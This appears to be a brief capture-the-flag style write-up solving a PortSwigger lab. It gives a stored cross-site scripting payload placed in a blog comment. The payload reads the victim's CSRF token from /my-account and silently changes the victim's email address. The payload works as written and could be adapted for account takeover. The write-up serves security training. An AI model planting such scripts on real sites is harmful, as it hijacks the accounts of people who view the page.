![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/902b9f16-ebed-4370-8fa6-b946c42eeb9e)

### Solution

Logged in to the given account

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/ef7abf79-7339-44e2-8f96-d89bfb8df8ea)

now update the email

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f3e3f5cd-2865-44dc-ae1a-5f6e8c56deb0)

the payload

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/dbb0f0c9-b1fc-4125-8033-19043e347552)

This will make anyone who views the comment issue a POST request to change their email address to test@test.com

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/bb6656f3-8a41-41d2-bdfb-9f1b9051235d)

lab solved
